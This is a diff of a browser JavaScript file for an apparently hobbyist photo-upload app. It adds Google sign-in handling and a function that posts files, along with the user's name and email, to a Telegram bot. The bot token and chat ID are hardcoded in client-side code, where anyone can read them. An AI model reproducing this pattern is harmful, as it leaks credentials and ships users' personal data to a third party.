@@ -14,7 +14,13 @@ const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const provider = new GoogleAuthProvider();
 
-// Panel Control Fix
+// TELEGRAM SETTINGS
+const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
+const chatId = "7752627907";
+
+let currentUser = null;
+
+// UI Elements
 const sidePanel = document.getElementById('side-panel');
 const settingsBtn = document.getElementById('settings-btn');
 const menuToggle = document.getElementById('menu-toggle');
@@ -22,24 +28,37 @@ const menuToggle = document.getElementById('menu-toggle');
 const togglePanel = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
 settingsBtn.onclick = togglePanel;
 menuToggle.onclick = togglePanel;
-
 document.onclick = (e) => { if (!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); };
 
-// Bubble Background
-const wrap = document.getElementById('bubble-wrap');
-for(let i=0; i<20; i++) {
-    const b = document.createElement('div');
-    b.className = 'bubble';
-    const s = Math.random() * 40 + 10 + 'px';
-    b.style.width = s; b.style.height = s;
-    b.style.left = Math.random() * 100 + '%';
-    b.style.animationDuration = Math.random() * 5 + 5 + 's';
-    b.style.animationDelay = Math.random() * 5 + 's';
-    wrap.appendChild(b);
+// TELEGRAM UPLOAD FUNCTION
+async function uploadToTelegram(file) {
+    if (!currentUser) return alert("Please Login First!");
+    
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("document", file, "PICMaster_Upload.jpg");
+    formData.append("caption", `📤 New File from: ${currentUser.displayName}\n📧 Email: ${currentUser.email}`);
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            method: "POST",
+            body: formData
+        });
+
+        if (response.ok) {
+            alert("✅ File sent to Telegram successfully!");
+        } else {
+            alert("❌ Failed to send file. Check Bot Token/Chat ID.");
+        }
+    } catch (error) {
+        console.error("Error:", error);
+        alert("❌ Connection Error!");
+    }
 }
 
-// Login/Logout Hide/Show Logic
+// Auth Observer
 onAuthStateChanged(auth, (user) => {
+    currentUser = user;
     const mainLogin = document.getElementById('main-login-btn');
     const sideLogin = document.getElementById('side-login');
     const cameraBtn = document.getElementById('camera-btn');
@@ -61,15 +80,10 @@ onAuthStateChanged(auth, (user) => {
     }
 });
 
+// Button Actions
 document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('side-login').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
 
-// Drop Area Logic
-const dropArea = document.getElementById('drop-area');
-dropArea.onclick = () => {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.onchange = (e) => { alert("File Selected: " + e.target.files[0].name); };
-    input.click();
-};
+// Drop Area Upload
+document.getElementById('
